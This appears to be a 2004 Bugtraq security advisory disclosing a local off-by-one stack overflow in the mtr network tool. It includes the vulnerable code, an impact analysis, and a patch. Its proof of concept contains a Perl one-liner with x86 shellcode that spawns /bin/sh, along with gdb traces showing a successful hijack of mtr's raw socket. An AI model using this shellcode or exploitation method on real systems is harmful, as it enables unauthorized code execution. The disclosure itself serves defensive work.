@@ -1,0 +1,217 @@
+
+Date: 11 Dec 2004 17:04:35 -0000
+From: venglin@...ebsd.lublin.pl
+To: bugtraq@...urityfocus.com, pawmal@...ebsd.lublin.pl,
+	venglin@...ebsd.lublin.pl
+Subject: Local off-by-one in mtr versions 0.55 to 0.65
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Local off-by-one in mtr versions 0.55 to 0.65
+- ----------------------------------------------
+Przemys�aw Frasunek <venglin@...ebsd.lublin.pl> / 11th December 2004
+
+1. Background
+
+mtr combines the functionality of the 'traceroute' and 'ping' programs
+in a single network diagnostic tool.
+
+As mtr starts, it investigates the network connection between the host mtr
+runs on and a user-specified destination host. After it determines the
+address of each network hop between the machines, it sends a sequence
+ICMP ECHO requests to each one to determine the quality of the link to each
+machine. As it does this, it prints running statistics about each machine.
+
+2. Vulnerability
+
+In version 0.55 the following portions of code were introduced
+in mtr_curses_keyaction() to handle the 's' keybinding:
+
+#define MAXFLD 20
+[...]
+char buf[MAXFLD];
+[...]
+if (tolower(c) == 's') {
+[...]
+   while ( (c=getch ()) != '\n' && i<MAXFLD ) {
+     attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh;
+     buf[i++] = c;   /* need more checking on 'c' */
+   }
+   buf[i] = '\0';
+[...]
+}
+
+as well as similar code for 'b', 'Q', 'i', 'f', 'm' and 'o' keybindings.
+
+The (i < MAXFLD) condition doesn't leave room in buf[] for NULL termination,
+making possible to overwrite LSB of saved %ebp register.
+
+3. Impact
+
+mtr is setuid root on most Linux distrubutions, but it drops elevated
+privileges just after opening raw socket. Therefore, exploitation of any
+bug in mtr allows only to hijack raw socket, which can be used to spoof
+ICMP packets.
+
+This bug is NOT exploitable if mtr is compiled with gcc 3.x, which aligns
+buffers on stack in slightly different way.
+
+4. Proof of concept
+
+> uname -smr
+FreeBSD 4.10-STABLE i386
+> unsetenv *
+> setenv DUPA `perl -e 'print "\x90"x780 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53\xb0\x3b\x50\xcd\x80"'`
+> gdb ./mtr
+GNU gdb 4.18 (FreeBSD) Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-unknown-freebsd"...Deprecated bfd_read called at /usr/src/gnu/usr.bin/binutils/gdb/../../../../contrib/gdb/gdb/dbxread.c line 2627 in elfstab_build_psymtabs
+Deprecated bfd_read called at /usr/src/gnu/usr.bin/binutils/gdb/../../../../contrib/gdb/gdb/dbxread.c line 933 in fill_symbuf
+
+(gdb) b mtr_curses_keyaction
+Breakpoint 1 at 0x80494d4: file curses.c, line 91.
+(gdb) r
+Starting program: /usr/ports/net/mtr/work/mtr-0.65/./mtr
+[...]
+Breakpoint 1, mtr_curses_keyaction () at curses.c:91
+91        int c = getch();
+(gdb) info frame
+Stack level 0, frame at 0xbfbff910:
+ eip = 0x80494d4 in mtr_curses_keyaction (curses.c:91); saved eip 0x804e6fd
+ called by frame at 0xbfbff920
+ source language c.
+ Arglist at 0xbfbff910, args:
+ Locals at 0xbfbff910, Previous frame's sp is 0x0
+ Saved registers:
+  ebx at 0xbfbff8d8, ebp at 0xbfbff910, edi at 0xbfbff8dc, eip at 0xbfbff914
+(gdb) x/x &buf[20]
+0xbfbff910:     0xbfbff920
+(gdb) watch *0xbfbff910
+Hardware watchpoint 2: *3217029392
+(gdb) cont
+Continuing.
+Max TTL: 30                       12333333333333333333
+Hardware watchpoint 2: *3217029392
+
+Old value = -1077937888
+New value = -1077937920
+mtr_curses_keyaction () at curses.c:209
+209         i = atoi( buf );
+(gdb) bt
+#0  mtr_curses_keyaction () at curses.c:209
+#1  0x804e6fd in display_keyaction () at display.c:147
+#2  0x33333333 in ?? ()
+Error accessing memory address 0x33333333: Bad address.
+(gdb) quit
+> gdb ./mtr
+GNU gdb 4.18 (FreeBSD)
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-unknown-freebsd"...Deprecated bfd_read called at /usr/src/gnu/usr.bin/binutils/gdb/../../../../contrib/gdb/gdb/dbxread.c line 2627 in elfstab_build_psymtabs
+Deprecated bfd_read called at /usr/src/gnu/usr.bin/binutils/gdb/../../../../contrib/gdb/gdb/dbxread.c line 933 in fill_symbuf
+
+(gdb) r
+Max TTL: 30                       `���`���`���`���`���
+Program received signal SIGTRAP, Trace/breakpoint trap.
+Cannot remove breakpoints because program is no longer writable.
+It might be running in another process.
+Further execution is probably impossible.
+0x80480b8 in ?? ()Error accessing memory address 0x48068bf4: Bad address.
+(gdb)
+(gdb) cont
+Continuing.
+>
+> fstat | grep 41484 | grep raw
+venglin     sh         41484    3* internet raw 255 f616fc80
+venglin     sh         41484    4* internet raw icmp f616fd40
+
+5. Credits
+
+Crash in mtr keybindins handler was found by Pawe� Ma�achowski
+<pawmal@...ebsd.lublin.pl>
+
+6. Patch
+
+- --- mtr-0.65/curses.c.old       Sat Dec 11 18:00:37 2004
++++ mtr-0.65/curses.c   Sat Dec 11 18:01:18 2004
+@@ -119,7 +119,7 @@
+     mvprintw(3, 0, "Size Range: %d-%d, <0 random.\n", MINPACKET, MAXPACKET);
+     move(2,20);
+     refresh();
+- -    while ( (c=getch ()) != '\n' && i<MAXFLD ) {
++    while ( (c=getch ()) != '\n' && i<MAXFLD-1 ) {
+       attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh ();
+       buf[i++] = c;   /* need more checking on 'c' */
+     }
+@@ -140,7 +140,7 @@
+     mvprintw(3, 0, "Pattern Range: 0(0x00)-255(0xff), <0 random.\n");
+     move(2,18);
+     refresh();
+- -    while ( (c=getch ()) != '\n' && i<MAXFLD ) {
++    while ( (c=getch ()) != '\n' && i<MAXFLD-1 ) {
+       attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh ();
+       buf[i++] = c;   /* need more checking on 'c' */
+     }
+@@ -154,7 +154,7 @@
+     mvprintw(3, 0, "default 0x00, min cost 0x02, rel 0x04,, thr 0x08, low del 0x10...\n");
+     move(2,22);
+     refresh();
+- -    while ( (c=getch ()) != '\n' && i<MAXFLD ) {
++    while ( (c=getch ()) != '\n' && i<MAXFLD-1 ) {
+       attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh();
+       buf[i++] = c;   /* need more checking on 'c' */
+     }
+@@ -169,7 +169,7 @@
+     mvprintw(2, 0, "Interval : %0.0f\n\n", WaitTime );
+     move(2,11);
+     refresh();
+- -    while ( (c=getch ()) != '\n' && i<MAXFLD ) {
++    while ( (c=getch ()) != '\n' && i<MAXFLD-1 ) {
+       attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh();
+       buf[i++] = c;   /* need more checking on 'c' */
+     }
+@@ -185,7 +185,7 @@
+     mvprintw(2, 0, "First TTL: %d\n\n", fstTTL );
+     move(2,11);
+     refresh();
+- -    while ( (c=getch ()) != '\n' && i<MAXFLD ) {
++    while ( (c=getch ()) != '\n' && i<MAXFLD-1 ) {
+       attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh();
+       buf[i++] = c;   /* need more checking on 'c' */
+     }
+@@ -201,7 +201,7 @@
+     mvprintw(2, 0, "Max TTL: %d\n\n", maxTTL );
+     move(2,9);
+     refresh();
+- -    while ( (c=getch ()) != '\n' && i<MAXFLD ) {
++    while ( (c=getch ()) != '\n' && i<MAXFLD-1 ) {
+       attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh();
+       buf[i++] = c;   /* need more checking on 'c' */
+     }
+@@ -226,7 +226,7 @@
+     refresh();
+
+     i = 0;
+- -    while ( (c=getch ()) != '\n' && i < MAXFLD ) {
++    while ( (c=getch ()) != '\n' && i < MAXFLD-1 ) {
+       if( strchr(available_options, c) ) {
+         attron(A_BOLD); printw("%c", c); attroff(A_BOLD); refresh();
+         buf[i++] = c; /* Only permit values in "available_options" be entered */
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.2.6 (FreeBSD)
+
+iD8DBQFBuyiikxEnBiV4/K0RAhPaAJ9ojWe9fUuMMAUDXSVzUpEtua3XGQCgpIO3
+6/yYXlERZd1GfnBqhILP8qw=
+=W9vj
+-----END PGP SIGNATURE-----
+
+
